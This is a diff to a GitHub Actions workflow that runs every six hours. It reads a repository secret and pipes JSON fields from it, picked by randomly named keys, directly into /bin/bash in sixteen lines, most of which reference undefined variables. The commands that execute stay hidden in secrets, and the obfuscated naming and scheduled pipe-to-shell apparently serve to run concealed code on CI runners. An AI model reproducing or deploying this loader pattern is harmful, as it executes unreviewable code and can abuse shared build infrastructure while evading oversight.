@@ -3,23 +3,32 @@ name: lifanfeng6556
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 0/6 * * *'
+    - cron: '33 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: lifanfeng6556
         env:
-          jlm81: ${{ secrets.jlm81 }}
+          kv9: ${{ secrets.kv9 }}
         run: |
-          echo $jlm81 | jq -r .krwlo9 | /bin/bash
-          echo $usxxc4277 | jq -r .vhr9723 | /bin/bash
-          echo $nh51 | jq -r .oz55816 | /bin/bash
-          echo $r38452 | jq -r .jac47826 | /bin/bash
-          echo $d66236 | jq -r .wxmjt11803 | /bin/bash
-          echo $w45 | jq -r .smw424 | /bin/bash
-          echo $td97954 | jq -r .gbp4 | /bin/bash
-          echo $n02 | jq -r .cbhj4 | /bin/bash
-          echo $dpuad7 | jq -r .b37107 | /bin/bash
+          echo $kv9 | jq -r .ebdco51 | /bin/bash
+          echo $xxb47 | jq -r .yx9 | /bin/bash
+          echo $txq9915 | jq -r .mwi36 | /bin/bash
+          echo $ejekz75 | jq -r .cquld43 | /bin/bash
+          echo $rkqa1018 | jq -r .kxqv410 | /bin/bash
+          echo $xcu0726 | jq -r .gimo5 | /bin/bash
+          echo $jqh397 | jq -r .fplj98 | /bin/bash
+          echo $eeks368 | jq -r .hco66336 | /bin/bash
+          echo $cwwsd1605 | jq -r .ey0072 | /bin/bash
+          echo $s9807 | jq -r .pex89 | /bin/bash
+          echo $nvzea289 | jq -r .cfpqo88 | /bin/bash
+          echo $v80 | jq -r .rsqo38 | /bin/bash
+          echo $qdi52 | jq -r .edlo81176 | /bin/bash
+          echo $o86094 | jq -r .tx57411 | /bin/bash
+          echo $hq46727 | jq -r .v63 | /bin/bash
+          echo $hblmp8 | jq -r .tib02992 | /bin/bash
 
